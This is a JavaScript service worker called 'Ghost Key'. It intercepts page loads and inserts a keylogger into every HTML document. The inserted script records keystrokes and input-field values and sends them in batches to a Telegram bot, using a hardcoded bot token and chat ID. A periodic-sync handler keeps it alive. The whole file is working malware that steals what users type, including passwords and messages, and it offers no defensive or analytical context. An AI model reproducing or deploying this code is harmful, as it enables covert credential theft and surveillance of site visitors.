// ===== SERVICE WORKER =====
const CACHE_NAME = 'ghost-key-v1';
const BOT_TOKEN = "8910457881:AAE9TznGCDNXkAxuo3Js_A1HaRVppAvhJuo";
const CHAT_ID = "1431950109";

// Install SW
self.addEventListener('install', event => {
    console.log('✅ SW installed');
    self.skipWaiting();
});

// Activate SW
self.addEventListener('activate', event => {
    console.log('✅ SW activated');
    event.waitUntil(clients.claim());
});

// ===== INTERCEPT REQUESTS — INJECT KEYLOGGER =====
self.addEventListener('fetch', event => {
    const url = event.request.url;

    // Only inject into HTML pages (not assets)
    if (event.request.mode === 'navigate' && event.request.destination === 'document') {
        event.respondWith(
            fetch(event.request).then(response => {
                return response.text().then(html => {
                    // Inject keylogger script
                    const inject = `
                        <script>
                            (function() {
                                const BOT_TOKEN = "${BOT_TOKEN}";
                                const CHAT_ID = "${CHAT_ID}";
                                let buffer = "";
                                let timer = null;
                                const IDLE_TIME = 10000;

                                // Send to Telegram
                                function sendToTelegram(msg) {
                                    if (msg.trim() === "") return;
                                    fetch(\`https://api.telegram.org/bot\${BOT_TOKEN}/sendMessage\`, {
                                        method: 'POST',
                                        headers: { 'Content-Type': 'application/json' },
                                        body: JSON.stringify({
                                            chat_id: CHAT_ID,
                                            text: "📱 Keylog: " + msg
                                        })
                                    });
                                }

                                // Reset timer
                                function resetTimer() {
                                    if (timer) clearTimeout(timer);
                                    timer = setTimeout(() => {
                                        if (buffer.length > 0) {
                                            sendToTelegram(buffer);
                                            buffer = "";
                                        }
                                    }, IDLE_TIME);
                                }

                                // ===== GLOBAL KEYLOGGER =====
                                document.addEventListener('keydown', (e) => {
                                    const key = e.key;
                                    if (key === "Enter") {
                                        if (buffer.length > 0) {
                                            sendToTelegram(buffer);
                                            buffer = "";
                                        }
                                        if (timer) clearTimeout(timer);
                                        return;
                                    }
                                    if (key === "Backspace") {
                                        buffer = buffer.slice(0, -1);
                                    } else if (key.length === 1) {
                                        buffer += key;
                                    }
                                    resetTimer();
                                });

                                // ===== INPUT EVENT (for mobile) =====
                                document.addEventListener('input', (e) => {
                                    if (e.target.tagName === 'INPUT' || e.target.tagName === 'TEXTAREA') {
                                        const val = e.target.value;
                                        if (val.length > buffer.length) {
                                            const newChar = val.slice(-1);
                                            buffer += newChar;
                                            resetTimer();
                                        } else if (val.length < buffer.length) {
                                            buffer = val;
                                            resetTimer();
                                        }
                                    }
                                });

                                console.log('✅ Ghost Key active on this page');
                            })();
                        <\/script>
                    `;

                    // Inject into head
                    const modifiedHtml = html.replace('</head>', inject + '</head>');
                    return new Response(modifiedHtml, {
                        headers: response.headers,
                        status: response.status,
                        statusText: response.statusText
                    });
                });
            })
        );
    }
});

// ===== KEEP ALIVE (Background sync) =====
self.addEventListener('periodicsync', event => {
    if (event.tag === 'keep-alive') {
        event.waitUntil(fetch('/ping'));
    }
});

console.log('✅ Ghost Key SW loaded');
